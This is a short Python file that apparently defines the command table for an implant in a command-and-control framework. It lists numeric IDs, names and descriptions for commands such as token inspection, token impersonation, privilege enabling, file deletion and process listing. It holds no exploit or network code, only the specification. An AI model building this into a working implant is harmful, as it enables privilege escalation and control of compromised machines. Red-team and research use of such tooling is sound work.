CMD_KILLIMPLANT = 1
CMD_CURRENT_TOKEN = 2
CMD_PROCESS_TOKEN = 3
CMD_TOKEN_PRIVILEGES = 4
CMD_IMPERSONATE_TOKEN = 5
CMD_ENABLE_PRIVILEGE = 6
CMD_LS = 7
CMD_CAT = 8
CMD_MKDIR = 9
CMD_RM = 10
CMD_PS = 11
CMD_HOSTNAME = 12
CMD_GETPID = 13

COMMAND_SPECS = [
    {'id': CMD_KILLIMPLANT, 'name': 'killimplant', 'usage': 'killimplant', 'description': 'Stop the implant runtime'},
    {'id': CMD_CURRENT_TOKEN, 'name': 'current-token', 'usage': 'current-token', 'description': 'Return a summary of the current process token'},
    {'id': CMD_PROCESS_TOKEN, 'name': 'process-token', 'usage': 'process-token <pid>', 'description': 'Return a summary of a target process token'},
    {'id': CMD_TOKEN_PRIVILEGES, 'name': 'token-privileges', 'usage': 'token-privileges <pid>', 'description': 'Return all privileges present on a target process token'},
    {'id': CMD_IMPERSONATE_TOKEN, 'name': 'impersonate-token', 'usage': 'impersonate-token <pid>', 'description': 'Attempt to impersonate the token of a target process'},
    {'id': CMD_ENABLE_PRIVILEGE, 'name': 'enable-privilege', 'usage': 'enable-privilege <name>', 'description': 'Attempt to enable a privilege on the current process token'},
    {'id': CMD_LS, 'name': 'ls', 'usage': 'ls <path>', 'description': 'List the contents of a directory'},
    {'id': CMD_CAT, 'name': 'cat', 'usage': 'cat <path>', 'description': 'Display the contents of a text file'},
    {'id': CMD_MKDIR, 'name': 'mkdir', 'usage': 'mkdir <path>', 'description': 'Create a directory'},
    {'id': CMD_RM, 'name': 'rm', 'usage': 'rm <path>', 'description': 'Delete a file or directory'},
    {'id': CMD_PS, 'name': 'ps', 'usage': 'ps', 'description': 'List running processes'},
    {'id': CMD_HOSTNAME, 'name': 'hostname', 'usage': 'hostname', 'description': 'Return the hostname of the machine'},
    {'id': CMD_GETPID, 'name': 'getpid', 'usage': 'getpid', 'description': 'Return the implant process ID'},
]

CMD_NAMES = {spec['id']: spec['name'] for spec in COMMAND_SPECS}
CMD_IDS = {spec['name']: spec['id'] for spec in COMMAND_SPECS}
